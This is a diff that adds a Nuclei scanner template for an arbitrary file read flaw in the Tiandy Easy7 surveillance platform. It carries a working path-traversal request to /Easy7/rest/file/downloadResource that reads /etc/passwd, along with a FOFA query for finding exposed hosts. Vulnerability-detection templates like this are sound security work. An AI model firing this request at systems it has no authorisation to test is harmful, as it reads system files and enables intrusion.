@@ -1,0 +1,29 @@
+id: tiandy-easy7-downloadresource-lfi
+
+info:
+  name: Tiandy Easy7 Arbitrary File Read
+  author: qwtd
+  severity: high
+  description: |
+      天地伟业 Easy7 是一款集视频监控、智能分析与远程管理于一体的综合安防管理平台。/Easy7/rest/file/downloadResource接口的path存在任意文件读取漏洞。
+  metadata:
+    max-request: 1
+    fofa-query: app="Tiandy-Easy7"
+  tags: Tiandy-Easy7
+
+http:
+  - raw:
+      - |
+        GET /Easy7/rest/file/downloadResource?path=../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+      - type: status
+        status:
+          - 200
